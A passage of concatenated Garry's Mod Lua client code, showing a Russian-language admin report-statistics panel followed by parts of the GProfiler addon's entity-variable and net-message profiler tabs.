		p:DockMargin(2,1,2,1)
		p:SetTall(ScrH()*.025)
		p.Paint = function(self, w, h)
			DrawBox(0,0,w,h)

			DrawShadowText(v.name, "reports_10", h, h*.5, Color(255,255,255), 0, 1)
			DrawShadowText(freports.FormatRankName(v.rank), "reports_10", w*.35, h*.5, freports.FormatRankColor(v.rank), 1, 1)
			DrawShadowText(v.total_reports, "reports_10", w*.65, h*.5, Color(255,255,255), 1, 1)
			DrawShadowText(v.rep, "reports_10", w - 8, h*.5, Color(255,255,255), 2, 1)
			if v.steamid == LocalPlayer():SteamID64() then
				surface.SetDrawColor(team.GetColor(LocalPlayer():Team()))
				surface.DrawOutlinedRect(0, 0, w, h)
			end
		end
		p.m_fCreateTime = SysTime()
		p.DoClick = function()
			surface.SetFont("reports_10")
			local fh = select(2, surface.GetTextSize("A"))

			local main = vgui.Create("DFrame")
			main:SetSize(ScrW()*.2, ScrH()*.5)
			main:Center()
			main:MakePopup()
			main:SetBackgroundBlur( true )
			main:SetTitle('')

			main.Paint = function(self, w, h)
				Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
				DrawBox(0,0,w,h)
				DrawBox(0,0,w,tallbar)
				DrawShadowText("Статистика", "reports_8", w * .5, tallbar_c, Color(255,255,255), 1, 1)
			end

			local month_total_reps = 0

			local scroll = vgui.Create("DScrollPanel", main)
			scroll:SetPos(2, tallbar + 2)
			scroll:SetSize(main:GetWide() - 4, main:GetTall() - tallbar - 4)

			local p1 = vgui.Create("DPanel", scroll)
			p1:Dock(TOP)
			p1:DockMargin(2, 1, 2, 1)
			p1:SetTall(main:GetTall() * .15)
			p1.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
			end

			local ava2 = vgui.Create("rp_avatar", p1)
			ava2:SetSize(p1:GetTall() - 8, p1:GetTall() - 8)
			ava2:SetPos(scroll:GetWide() * .5 - ava2:GetWide()*.5, 4)
			ava2:SetSteamID(v.steamid, 184)

			local p2 = vgui.Create("DPanel", scroll)
			p2:Dock(TOP)
			p2:DockMargin(2, 1, 2, 1)
			p2:SetTall(fh + 8)
			p2.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText(v.name, "reports_10", w * .5, h * .5, Color(255,255,255), 1, 1)
			end

			local p2 = vgui.Create("DButton", scroll)
			p2:Dock(TOP)
			p2:DockMargin(2, 1, 2, 1)
			p2:SetTall(fh + 8)
			p2:SetText('')
			p2.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText(util.SteamIDFrom64(v.steamid), "reports_10", w * .5, h * .5, Color(255,255,255), 1, 1)
			end
			p2.DoClick = function()
				surface.PlaySound("garrysmod/ui_click.wav")
				SetClipboardText(util.SteamIDFrom64(v.steamid))
			end

			local p3 = vgui.Create("DPanel", scroll)
			p3:Dock(TOP)
			p3:DockMargin(2, 1, 2, 1)
			p3:SetTall(fh + 8)
			p3.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText(freports.FormatRankName(v.rank), "reports_10", w*.5, h*.5, freports.FormatRankColor(v.rank), 1, 1)
			end

			local p4 = vgui.Create("DPanel", scroll)
			p4:Dock(TOP)
			p4:DockMargin(2, 1, 2, 1)
			p4:SetTall(fh + fh + 10)
			p4.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText("Последний раз заходил" , "reports_10", w*.5, 2, Color(255,255,255), 1, 0)
				DrawShadowText(os.date("%d/%m/%Y - %H:%M", v.last_seen) , "reports_10", w*.5, h - fh - 2, Color(255,255,255), 1, 0)
			end

			local p5 = vgui.Create("DPanel", scroll)
			p5:Dock(TOP)
			p5:DockMargin(2, 1, 2, 1)
			p5:SetTall(fh + 8)
			p5.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText("Репутация: " .. v.rep , "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
			end

			local p6 = vgui.Create("DPanel", scroll)
			p6:Dock(TOP)
			p6:DockMargin(2, 1, 2, 1)
			p6:SetTall(fh + 8)
			p6.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText("Всего жалоб: " .. v.total_reports , "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
			end

			local p6 = vgui.Create("DPanel", scroll)
			p6:Dock(TOP)
			p6:DockMargin(2, 1, 2, 1)
			p6:SetTall(fh + 8)
			p6.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText("Жалоб за месяц: " .. month_total_reps , "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
			end

			local p7 = vgui.Create("DPanel", scroll)
			p7:Dock(TOP)
			p7:DockMargin(2, 1, 2, 1)
			p7:SetTall(fh + 8)
			p7.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText("Онлайн", "reports_8", w*.5, h*.5, Color(255, 255, 255), 1, 1)
			end

			if not istable(v.daily_online) then
				v.daily_online = util.JSONToTable(v.daily_online)
			end
			local temp_month = {}

			for k,v in pairs(v.daily_online) do
				temp_month[#temp_month + 1] = {k, v}
			end

			table.sort( temp_month, function( a, b ) return a[1] < b[1] end )

			for _,v in ipairs(temp_month) do
				local bar = vgui.Create("DPanel", scroll)
				bar:Dock(TOP)
				bar:DockMargin(2,1,2,1)
				bar:SetTall(fh + 4)
				bar.process = 0
				bar.Paint = function(self,w,h)
					surface.SetDrawColor(0,0,0,100)
					surface.DrawRect(0,0,w,h)

					self.process = Lerp( 0.06, self.process, (w - 4) * v[2] / 86400)

					surface.SetDrawColor(111,255,111,100)
					surface.DrawRect(2,2,self.process,h-4)

					DrawShadowText(v[1], "reports_10", 2, h*.5, Color(255, 255, 255), 0, 1)
					DrawShadowText(FormatPlayedTime(v[2]), "reports_10", w - 2, h*.5, Color(255, 255, 255), 2, 1)
				end
			end

			local p8 = vgui.Create("DPanel", scroll)
			p8:Dock(TOP)
			p8:DockMargin(2, 1, 2, 1)
			p8:SetTall(fh + 8)
			p8.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText("Онлайн в админ профе", "reports_8", w*.5, h*.5, Color(255, 255, 255), 1, 1)
			end

			if not istable(v.daily_online_onduty) then
				v.daily_online_onduty = util.JSONToTable(v.daily_online_onduty)
			end
			local temp_month = {}

			for k,v in pairs(v.daily_online_onduty) do
				temp_month[#temp_month + 1] = {k, v}
			end

			table.sort( temp_month, function( a, b ) return a[1] < b[1] end )

			for _,v in ipairs(temp_month) do
				local bar = vgui.Create("DPanel", scroll)
				bar:Dock(TOP)
				bar:DockMargin(2,1,2,1)
				bar:SetTall(fh + 4)
				bar.process = 0
				bar.Paint = function(self,w,h)
					surface.SetDrawColor(0,0,0,100)
					surface.DrawRect(0,0,w,h)

					self.process = Lerp( 0.06, self.process, (w - 4) * v[2] / 86400)

					surface.SetDrawColor(255,55,55,100)
					surface.DrawRect(2,2,self.process,h-4)

					DrawShadowText(v[1], "reports_10", 2, h*.5, Color(255, 255, 255), 0, 1)
					DrawShadowText(FormatPlayedTime(v[2]), "reports_10", w - 2, h*.5, Color(255, 255, 255), 2, 1)
				end
			end

			local p9 = vgui.Create("DPanel", scroll)
			p9:Dock(TOP)
			p9:DockMargin(2, 1, 2, 1)
			p9:SetTall(fh + 8)
			p9.Paint = function(self, w, h)
				DrawBox(0,0,w,h)
				DrawShadowText("Жалобы", "reports_8", w*.5, h*.5, Color(255, 255, 255), 1, 1)
			end

			if not istable(v.daily_reports) then
				v.daily_reports = util.JSONToTable(v.daily_reports)
			end
			local temp_month = {}

			for k,v in pairs(v.daily_reports) do
				temp_month[#temp_month + 1] = {k, v}
			end

			table.sort( temp_month, function( a, b ) return a[1] < b[1] end )
			for _,v in ipairs(temp_month) do
				month_total_reps = month_total_reps + v[2]
				local bar = vgui.Create("DPanel", scroll)
				bar:Dock(TOP)
				bar:DockMargin(2,1,2,1)
				bar:SetTall(fh + 4)
				bar.process = 0
				bar.Paint = function(self,w,h)
					surface.SetDrawColor(0,0,0,100)
					surface.DrawRect(0,0,w,h)

					self.process = Lerp( 0.06, self.process, (w - 4) * v[2] / 100)

					surface.SetDrawColor(255,255,100,100)
					surface.DrawRect(2,2,self.process,h-4)

					DrawShadowText(v[1], "reports_10", 2, h*.5, Color(255, 255, 255), 0, 1)
					DrawShadowText(v[2] .. " жб", "reports_10", w - 2, h*.5, Color(255, 255, 255), 2, 1)
				end
			end
		end

		local ava = vgui.Create("rp_avatar", p)
		ava:SetPos(4, 4)
		ava:SetSize(p:GetTall() - 8, p:GetTall() - 8)
		ava:SetSteamID(v.steamid, 184)

		if IsValid(load_more) then load_more:Remove() end

		load_more = vgui.Create("DButton", scroll)
		load_more:SetText('')
		load_more:Dock(TOP)
		load_more:DockMargin(2,1,2,1)
		load_more:SetTall(ScrH()*.025)
		load_more.Paint = function(self, w, h)
			if (self.Depressed or self.m_bSelected) then
				DrawBox(0,0,w,h)
			elseif (self.Hovered) then
				DrawBox(0,0,w,h, Color(255, 155, 55, 40))
			else
				DrawBox(0,0,w,h)
			end

			DrawShadowText("Загрузить еще...", "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
		end
		
		load_more.DoClick = function(self)
			page = page + 1
			net.Start("freports.reports_statistics.load_more")
				net.WriteInt(page, 32)
			net.SendToServer()

			self:SetEnabled(false)
			timer.Simple(2, function()
				if IsValid(self) then
					self:SetEnabled(true)
				end
			end)
		end
	end

	local function ReBuildScroll(tb)
		for k,v in pairs(sheet) do
			v:Remove()
		end
		sheet = {}

		for k,v in ipairs(tb) do
			AddB(k,v)
		end

		page = 1
	end

	ReBuildScroll(data)

	net.Receive("freports.reports_statistics.search", function()
		if not IsValid(main) then return end
		local data = net.ReadTable()
		ReBuildScroll(data)
	end)

	net.Receive("freports.reports_statistics.load_more", function()
		if not IsValid(main) then return end

		local data = net.ReadTable()
		for k,v in ipairs(data) do
			AddB(k,v)
		end
	end)

	local search_type = vgui.Create( "DComboBox", main )
	search_type:SetPos( 2, main:GetTall() - tallbar - 2)
	search_type:SetSize( main:GetWide()*.2 - 4, tallbar )
	search_type:AddChoice("SteamID")
	search_type:AddChoice("SteamID64")
	search_type:AddChoice("Rank")
	search_type:AddChoice("Nick", nil, true)
	search_type.OnSelect = function( panel, index, value )

	end

	local search_p = vgui.Create("DTextEntry", main)
	search_p:SetSize(main:GetWide()*.8 - 4, tallbar)
	search_p:SetPos(main:GetWide()*.2, main:GetTall() - tallbar - 2)
	search_p:SetToolTip("Поиск")
	search_p.OnEnter = function()
		surface.PlaySound("garrysmod/ui_click.wav")

		if #search_p:GetText() < 3 then return end

		local search_by = search_p:GetText()
		if search_type:GetSelectedID() == 1 or search_type:GetSelectedID() == 2 then
			search_by = string.Replace( search_by, " ", "" )
		end

		net.Start("freports.reports_statistics.search")
			net.WriteInt(search_type:GetSelectedID(), 32)
			net.WriteString(search_p:GetText())
		net.SendToServer()
	end
end)

net.Receive("freports.request_admin_statistic", function()
	local v = net.ReadTable()

	surface.SetFont("reports_10")
	local fh = select(2, surface.GetTextSize("A"))

	local main = vgui.Create("DFrame")
	main:SetSize(ScrW()*.2, ScrH()*.5)
	main:Center()
	main:MakePopup()
	main:SetBackgroundBlur( true )
	main:SetTitle('')

	main.Paint = function(self, w, h)
		Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
		DrawBox(0,0,w,h)
		DrawBox(0,0,w,tallbar)
		DrawShadowText("Статистика", "reports_8", w * .5, tallbar_c, Color(255,255,255), 1, 1)
	end

	local month_total_reps = 0

	local scroll = vgui.Create("DScrollPanel", main)
	scroll:SetPos(2, tallbar + 2)
	scroll:SetSize(main:GetWide() - 4, main:GetTall() - tallbar - 4)

	local p1 = vgui.Create("DPanel", scroll)
	p1:Dock(TOP)
	p1:DockMargin(2, 1, 2, 1)
	p1:SetTall(main:GetTall() * .15)
	p1.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
	end

	local ava2 = vgui.Create("rp_avatar", p1)
	ava2:SetSize(p1:GetTall() - 8, p1:GetTall() - 8)
	ava2:SetPos(scroll:GetWide() * .5 - ava2:GetWide()*.5, 4)
	ava2:SetSteamID(v.steamid, 184)

	local p2 = vgui.Create("DPanel", scroll)
	p2:Dock(TOP)
	p2:DockMargin(2, 1, 2, 1)
	p2:SetTall(fh + 8)
	p2.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText(v.name, "reports_10", w * .5, h * .5, Color(255,255,255), 1, 1)
	end

	local p2 = vgui.Create("DButton", scroll)
	p2:Dock(TOP)
	p2:DockMargin(2, 1, 2, 1)
	p2:SetTall(fh + 8)
	p2:SetText('')
	p2.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText(util.SteamIDFrom64(v.steamid), "reports_10", w * .5, h * .5, Color(255,255,255), 1, 1)
	end
	p2.DoClick = function()
		surface.PlaySound("garrysmod/ui_click.wav")
		SetClipboardText(util.SteamIDFrom64(v.steamid))
	end

	local p3 = vgui.Create("DPanel", scroll)
	p3:Dock(TOP)
	p3:DockMargin(2, 1, 2, 1)
	p3:SetTall(fh + 8)
	p3.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText(freports.FormatRankName(v.rank), "reports_10", w*.5, h*.5, freports.FormatRankColor(v.rank), 1, 1)
	end

	local p4 = vgui.Create("DPanel", scroll)
	p4:Dock(TOP)
	p4:DockMargin(2, 1, 2, 1)
	p4:SetTall(fh + fh + 10)
	p4.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText("Последний раз заходил" , "reports_10", w*.5, 2, Color(255,255,255), 1, 0)
		DrawShadowText(os.date("%d/%m/%Y - %H:%M", v.last_seen) , "reports_10", w*.5, h - fh - 2, Color(255,255,255), 1, 0)
	end

	local p5 = vgui.Create("DPanel", scroll)
	p5:Dock(TOP)
	p5:DockMargin(2, 1, 2, 1)
	p5:SetTall(fh + 8)
	p5.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText("Репутация: " .. v.rep , "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
	end

	local p6 = vgui.Create("DPanel", scroll)
	p6:Dock(TOP)
	p6:DockMargin(2, 1, 2, 1)
	p6:SetTall(fh + 8)
	p6.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText("Всего жалоб: " .. v.total_reports , "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
	end

	local p6 = vgui.Create("DPanel", scroll)
	p6:Dock(TOP)
	p6:DockMargin(2, 1, 2, 1)
	p6:SetTall(fh + 8)
	p6.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText("Жалоб за месяц: " .. month_total_reps , "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
	end

	local p7 = vgui.Create("DPanel", scroll)
	p7:Dock(TOP)
	p7:DockMargin(2, 1, 2, 1)
	p7:SetTall(fh + 8)
	p7.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText("Онлайн", "reports_8", w*.5, h*.5, Color(255, 255, 255), 1, 1)
	end

	if not istable(v.daily_online) then
		v.daily_online = util.JSONToTable(v.daily_online)
	end
	local temp_month = {}

	for k,v in pairs(v.daily_online) do
		temp_month[#temp_month + 1] = {k, v}
	end

	table.sort( temp_month, function( a, b ) return a[1] < b[1] end )

	for _,v in ipairs(temp_month) do
		local bar = vgui.Create("DPanel", scroll)
		bar:Dock(TOP)
		bar:DockMargin(2,1,2,1)
		bar:SetTall(fh + 4)
		bar.process = 0
		bar.Paint = function(self,w,h)
			surface.SetDrawColor(0,0,0,100)
			surface.DrawRect(0,0,w,h)

			self.process = Lerp( 0.06, self.process, (w - 4) * v[2] / 86400)

			surface.SetDrawColor(111,255,111,100)
			surface.DrawRect(2,2,self.process,h-4)

			DrawShadowText(v[1], "reports_10", 2, h*.5, Color(255, 255, 255), 0, 1)
			DrawShadowText(FormatPlayedTime(v[2]), "reports_10", w - 2, h*.5, Color(255, 255, 255), 2, 1)
		end
	end

	local p8 = vgui.Create("DPanel", scroll)
	p8:Dock(TOP)
	p8:DockMargin(2, 1, 2, 1)
	p8:SetTall(fh + 8)
	p8.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText("Жалобы", "reports_8", w*.5, h*.5, Color(255, 255, 255), 1, 1)
	end

	if not istable(v.daily_reports) then
		v.daily_reports = util.JSONToTable(v.daily_reports)
	end
	local temp_month = {}

	for k,v in pairs(v.daily_reports) do
		temp_month[#temp_month + 1] = {k, v}
	end

	table.sort( temp_month, function( a, b ) return a[1] < b[1] end )
	for _,v in ipairs(temp_month) do
		month_total_reps = month_total_reps + v[2]
		local bar = vgui.Create("DPanel", scroll)
		bar:Dock(TOP)
		bar:DockMargin(2,1,2,1)
		bar:SetTall(fh + 4)
		bar.process = 0
		bar.Paint = function(self,w,h)
			surface.SetDrawColor(0,0,0,100)
			surface.DrawRect(0,0,w,h)

			self.process = Lerp( 0.06, self.process, (w - 4) * v[2] / 100)

			surface.SetDrawColor(255,255,100,100)
			surface.DrawRect(2,2,self.process,h-4)

			DrawShadowText(v[1], "reports_10", 2, h*.5, Color(255, 255, 255), 0, 1)
			DrawShadowText(v[2] .. " жб", "reports_10", w - 2, h*.5, Color(255, 255, 255), 2, 1)
		end
	end
end)
--PATH addons/gprofiler/lua/gprofiler/profilers/entvars/cl_entvars.lua:
GProfiler.EntVars = GProfiler.EntVars or {}
GProfiler.EntVars.ProfileActive = GProfiler.EntVars.ProfileActive or false
GProfiler.EntVars.StartTime = GProfiler.EntVars.StartTime or 0
GProfiler.EntVars.EndTime = GProfiler.EntVars.EndTime or 0

local TabPadding = 10
local MenuColors = GProfiler.MenuColors

function GProfiler.EntVars.DoTab(Content)
	local Header = vgui.Create("DPanel", Content)
	Header:SetSize(Content:GetWide(), 40)
	Header:SetPos(0, 10)
	Header.Paint = function() end

	local StartButton = vgui.Create("DButton", Header)
	StartButton:SetText(GProfiler.EntVars.ProfileActive and GProfiler.Language.GetPhrase("profiler_stop") or GProfiler.Language.GetPhrase("profiler_start"))
	StartButton:SetTextColor(MenuColors.White)
	StartButton:SetFont("GProfiler.Menu.RealmSelector")
	StartButton:SizeToContents()
	StartButton:SetTall(30)
	StartButton:SetPos(Header:GetWide() - StartButton:GetWide() - TabPadding * 2, Header:GetTall() / 2 - StartButton:GetTall() / 2)
	StartButton.Paint = function(s, w, h)
		draw.RoundedBox(4, 0, 0, w, h, MenuColors.ButtonOutline)
		draw.RoundedBox(4, 1, 1, w - 2, h - 2, MenuColors.ButtonBackground)

		if s:IsHovered() then
			draw.RoundedBox(4, 1, 1, w - 2, h - 2, MenuColors.ButtonHover)
		end
	end

	function StartButton:DoClick()
		if GProfiler.EntVars.ProfileActive then
			GProfiler.EntVars.ProfileActive = false
			GProfiler.EntVars.EndTime = SysTime()
			GProfiler.Menu.OpenTab("Entity Variables", GProfiler.EntVars.DoTab)
			self:SetText(GProfiler.Language.GetPhrase("profiler_start"))
		else
			GProfiler.EntVars.ProfileData = {}
			GProfiler.EntVars.ProfileActive = true
			GProfiler.EntVars.StartTime = SysTime()
			self:SetText(GProfiler.Language.GetPhrase("profiler_stop"))
		end
	end

	local TimeRunning = vgui.Create("DLabel", Header)
	TimeRunning:SetFont("GProfiler.Menu.SectionHeader")
	TimeRunning:SetText(GProfiler.TimeRunning(GProfiler.EntVars.StartTime, GProfiler.EntVars.EndTime, GProfiler.EntVars.ProfileActive) .. "s")
	TimeRunning:SizeToContents()
	TimeRunning:SetPos(Header:GetWide() - TimeRunning:GetWide() - StartButton:GetWide() - TabPadding * 3, Header:GetTall() / 2 - TimeRunning:GetTall() / 2)
	TimeRunning:SetTextColor(MenuColors.White)
	function TimeRunning:Think()
		if GProfiler.EntVars.ProfileActive then
			self:SetText(GProfiler.TimeRunning(GProfiler.EntVars.StartTime, 0, GProfiler.EntVars.ProfileActive) .. "s")
			self:SizeToContents()
			self:SetPos(Header:GetWide() - self:GetWide() - StartButton:GetWide() - TabPadding * 3, Header:GetTall() / 2 - self:GetTall() / 2)
		end
	end

	local SectionHeader = vgui.Create("DPanel", Content)
	SectionHeader:SetSize(Content:GetWide(), 40)
	SectionHeader:SetPos(0, Header:GetTall())
	SectionHeader.Paint = function() end

	local Header, HeaderText = GProfiler.Menu.CreateHeader(SectionHeader, GProfiler.Language.GetPhrase("profiler_results"), 0, 0, SectionHeader:GetWide() - 5, SectionHeader:GetTall())

	local ProfilerContent = vgui.Create("DPanel", Content)
	ProfilerContent:SetSize(Content:GetWide() - 5, Content:GetTall() - SectionHeader:GetTall() - Header:GetTall())
	ProfilerContent:SetPos(0, SectionHeader:GetTall() + Header:GetTall())
	ProfilerContent.Paint = function() end

	local ProfilerResults = vgui.Create("DListView", ProfilerContent)
	ProfilerResults:SetSize(ProfilerContent:GetWide() - TabPadding * 2, ProfilerContent:GetTall() - TabPadding * 2)
	ProfilerResults:SetPos(TabPadding, TabPadding)
	ProfilerResults:SetMultiSelect(false)
	ProfilerResults:AddColumn(GProfiler.Language.GetPhrase("entity"))
	ProfilerResults:AddColumn(GProfiler.Language.GetPhrase("variable"))
	ProfilerResults:AddColumn(GProfiler.Language.GetPhrase("times_updated"))
	ProfilerResults:AddColumn(GProfiler.Language.GetPhrase("current_value"))

	for k, v in pairs(GProfiler.EntVars.ProfileData or {}) do
		if not v.GProfiler_SavedEnt then continue end
		for var, val in pairs(v) do
			if var == "GProfiler_SavedEnt" or var == "GProfiler_CurrentValues" then continue end
			local Line = ProfilerResults:AddLine(v.GProfiler_SavedEnt, var, val, v.GProfiler_CurrentValues[var] or "Unknown")
			Line.OnRightClick = function()
				local menu = DermaMenu()
				menu:AddOption(GProfiler.CopyLang("entity"), function() SetClipboardText(v.GProfiler_SavedEnt) end):SetIcon("icon16/page_copy.png")
				menu:AddOption(GProfiler.CopyLang("variable"), function() SetClipboardText(var) end):SetIcon("icon16/page_copy.png")
				menu:AddOption(GProfiler.CopyLang("times_updated"), function() SetClipboardText(val) end):SetIcon("icon16/page_copy.png")
				menu:AddOption(GProfiler.CopyLang("current_value"), function() SetClipboardText(v.GProfiler_CurrentValues[var] or "Unknown") end):SetIcon("icon16/page_copy.png")
				menu:Open()
			end
		end
	end

	ProfilerResults:SortByColumn(3, true)

	GProfiler.StyleDListView(ProfilerResults)
end

GProfiler.Menu.RegisterTab("Entity Variables", "icon16/database_edit.png", 6, GProfiler.EntVars.DoTab, function()
	if GProfiler.EntVars.ProfileActive then
		return "", MenuColors.ActiveProfile
	end
	return nil
end)

function GProfiler.EntVars.CollectData(ent, var, _, val)
	if not GProfiler.EntVars.ProfileActive then return end

	if not GProfiler.EntVars.ProfileData[ent] then
		GProfiler.EntVars.ProfileData[ent] = {}
		GProfiler.EntVars.ProfileData[ent].GProfiler_SavedEnt = tostring(ent)
		GProfiler.EntVars.ProfileData[ent].GProfiler_CurrentValues = {}
	end

	GProfiler.EntVars.ProfileData[ent][var] = (GProfiler.EntVars.ProfileData[ent][var] or 0) + 1

	GProfiler.EntVars.ProfileData[ent].GProfiler_CurrentValues[var] = tostring(val)
end

local function CaptureEnt(ent, attempts)
	if not IsValid(ent) then return end
	if not ent.GetNetworkVars then
		if attempts and attempts > 5 then return end
		timer.Simple(.5, function() CaptureEnt(ent, (attempts or 0) + 1) end)
		return
	end

	for k, v in pairs(ent:GetNetworkVars() or {}) do
		local GProfilerIdent = string.format("GProfiler.%s", k)
		if ent[GProfilerIdent] then continue end
		ent[GProfilerIdent] = true
		ent:NetworkVarNotify(k, GProfiler.EntVars.CollectData)
	end
end

hook.Add("OnEntityCreated", "GProfiler.EntVars.CaptureEnt", CaptureEnt)
hook.Add("InitPostEntity", "GProfiler.EntVars.CaptureEnts", function()
	for k, v in ipairs(ents.GetAll()) do CaptureEnt(v) end
end)

--PATH addons/gprofiler/lua/gprofiler/profilers/net/cl_net.lua:
GProfiler.Net = GProfiler.Net or {}
GProfiler.Net.Realm = GProfiler.Net.Realm or "Client"
GProfiler.Net.ProfileActive = GProfiler.Net.ProfileActive or false
GProfiler.Net.StartTime = GProfiler.Net.StartTime or 0
GProfiler.Net.EndTime = GProfiler.Net.EndTime or 0

local TabPadding = 10
local MenuColors = GProfiler.MenuColors

local function FormatBites(bites)
	if bites < 1024 then
		return bites .. "b"
	elseif bites < 1024 * 1024 then
		return math.Round(bites / 1024, 2) .. "kb"
	else
		return math.Round(bites / 1024 / 1024, 2) .. "mb"
	end
end

local function GetReceiverTable(realm, callback)
	if realm == "Server" then
		net.Start("GProfiler_Net_ReceiverTbl")
		net.SendToServer()
		net.Receive("GProfiler_Net_ReceiverTbl", function()
			local receiverCount = net.ReadUInt(32)
			local receiverTbl = {}
			for i = 1, receiverCount do
				receiverTbl[net.ReadString()] = {
					net.ReadString(),
					net.ReadString(),
					net.ReadUInt(16),
					net.ReadUInt(16)
				}
			end
			callback(receiverTbl)
		end)
	else
		local receiverTbl = {}
		for k, v in pairs(net.Receivers) do
			local Source = debug.getinfo(v, "S") or {short_src = "", linedefined = 0, lastlinedefined = 0}
			receiverTbl[k] = {
				string.format("%s (%s)", tostring(v), GProfiler.GetFunctionLocation(v)),
				Source.short_src,
				Source.linedefined,
				Source.lastlinedefined
			}
		end
		callback(receiverTbl)
	end
end

function GProfiler.Net.DoTab(Content)
	local Header = vgui.Create("DPanel", Content)
	Header:SetSize(Content:GetWide(), 40)
	Header:SetPos(0, 10)
	Header.Paint = function() end

	local RealmSelector = GProfiler.Menu.CreateRealmSelector(Header, "Net", Header:GetWide() - TabPadding - 110, Header:GetTall() / 2 - 30 / 2, 110, 30, function(s, _, value)
		GProfiler.Net.Realm = value
		GProfiler.Menu.OpenTab("Net", GProfiler.Net.DoTab)
	end)
	RealmSelector:SetPos(Header:GetWide() - RealmSelector:GetWide() - TabPadding, Header:GetTall() / 2 - RealmSelector:GetTall() / 2)

	local StartButton = vgui.Create("DButton", Header)
	StartButton:SetText(GProfiler.Net.ProfileActive and GProfiler.Language.GetPhrase("profiler_stop") or GProfiler.Language.GetPhrase("profiler_start"))
	StartButton:SetTextColor(MenuColors.White)
	StartButton:SetFont("GProfiler.Menu.RealmSelector")
	StartButton:SizeToContents()
	StartButton:SetTall(30)
	StartButton:SetPos(Header:GetWide() - StartButton:GetWide() - RealmSelector:GetWide() - TabPadding * 2, Header:GetTall() / 2 - StartButton:GetTall() / 2)
	StartButton.Paint = function(s, w, h)
		draw.RoundedBox(4, 0, 0, w, h, MenuColors.ButtonOutline)
		draw.RoundedBox(4, 1, 1, w - 2, h - 2, MenuColors.ButtonBackground)

		if s:IsHovered() then
			draw.RoundedBox(4, 1, 1, w - 2, h - 2, MenuColors.ButtonHover)
		end
	end

	local NetTimeRunning = vgui.Create("DLabel", Header)
	NetTimeRunning:SetFont("GProfiler.Menu.SectionHeader")
	NetTimeRunning:SetText(GProfiler.TimeRunning(GProfiler.Net.StartTime, GProfiler.Net.EndTime, GProfiler.Net.ProfileActive) .. "s")
	NetTimeRunning:SizeToContents()
	NetTimeRunning:SetPos(Header:GetWide() - NetTimeRunning:GetWide() - RealmSelector:GetWide() - StartButton:GetWide() - TabPadding * 3, Header:GetTall() / 2 - NetTimeRunning:GetTall() / 2)
	NetTimeRunning:SetTextColor(MenuColors.White)
	function NetTimeRunning:Think()
		if GProfiler.Net.ProfileActive then
			self:SetText(GProfiler.TimeRunning(GProfiler.Net.StartTime, 0, GProfiler.Net.ProfileActive) .. "s")
			self:SizeToContents()
			self:SetPos(Header:GetWide() - self:GetWide() - RealmSelector:GetWide() - StartButton:GetWide() - TabPadding * 3, Header:GetTall() / 2 - self:GetTall() / 2)
		end
	end

	StartButton.DoClick = function()
		if GProfiler.Net.ProfileActive then
			GProfiler.Net.EndTime = SysTime()
			if GProfiler.Net.Realm == "Server" then
				net.Start("GProfiler_Net_ToggleServerProfile")
				net.WriteBool(false)
				net.SendToServer()
			else
				GProfiler.Net:RestoreNet()
				GProfiler.Net.ProfileActive = false
				GProfiler.Menu.OpenTab("Net", GProfiler.Net.DoTab)
			end

			if timer.Exists("GProfiler.Net.Time") then
				timer.Remove("GProfiler.Net.Time")
			end
		else
			GProfiler.Net.StartTime = SysTime()
			GProfiler.Net.EndTime = 0
			if GProfiler.Net.Realm == "Server" then
				net.Start("GProfiler_Net_ToggleServerProfile")
				net.WriteBool(true)
				net.SendToServer()
			else
				GProfiler.Net:DetourNet()
				GProfiler.Net.ProfileActive = true
				StartButton:SetText(GProfiler.Language.GetPhrase("profiler_stop"))
			end
		end
	end

	local SectionHeader = vgui.Create("DPanel", Content)
	SectionHeader:SetSize(Content:GetWide(), 40)
	SectionHeader:SetPos(0, Header:GetTall())
	SectionHeader.Paint = function() end

	local leftFraction = .7
	local rightFraction = .3

	local LeftHeader = GProfiler.Menu.CreateHeader(SectionHeader, GProfiler.Language.GetPhrase("profiler_results"), 0, 0, SectionHeader:GetWide() * leftFraction - 5, SectionHeader:GetTall())
	local RightHeader = GProfiler.Menu.CreateHeader(SectionHeader, GProfiler.Language.GetPhrase("Receiver Function"), LeftHeader:GetWide() + 10, 0, SectionHeader:GetWide() * rightFraction - 5, LeftHeader:GetTall())

	local LeftContent = vgui.Create("DPanel", Content)
	LeftContent:SetSize(LeftHeader:GetWide(), Content:GetTall() - SectionHeader:GetTall() - Header:GetTall())
	LeftContent:SetPos(0, SectionHeader:GetTall() + Header:GetTall())
	LeftContent.Paint = function() end

	local RightContent = vgui.Create("DPanel", Content)
	RightContent:SetSize(RightHeader:GetWide(), Content:GetTall() - SectionHeader:GetTall() - Header:GetTall())
	RightContent:SetPos(LeftContent:GetWide() + 10, SectionHeader:GetTall() + Header:GetTall())
	RightContent.Paint = function() end

	local ProfilerResults = vgui.Create("DListView", LeftContent)
